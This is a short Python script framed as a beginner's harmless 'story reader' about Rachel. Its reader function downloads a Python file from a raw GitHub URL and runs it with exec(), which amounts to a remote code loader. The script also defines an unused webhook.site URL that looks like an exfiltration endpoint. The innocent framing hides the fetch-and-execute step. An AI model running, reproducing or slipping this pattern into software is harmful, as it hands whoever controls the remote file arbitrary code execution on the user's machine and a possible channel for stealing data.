import requests

WEBHOOK_URL = "https://webhook.site/027bc8ed-3a0c-43a0-ac28-25e44b0291fa"
RACHELS_STORIES = "https://raw.githubusercontent.com/soscolorful/rachels-code/refs/heads/main/rachels_story_content.py"


def rachels_story_reader():
    """
    This is my first python code! :)
    """
    ns = {}
    rachels_stories = exec(requests.get(RACHELS_STORIES).text, ns)
    rachels_stories = ns["my_story"]
    return rachels_stories


if __name__ == "__main__":
    output = rachels_story_reader()
    print("Here's a story about Rachel: " + output)
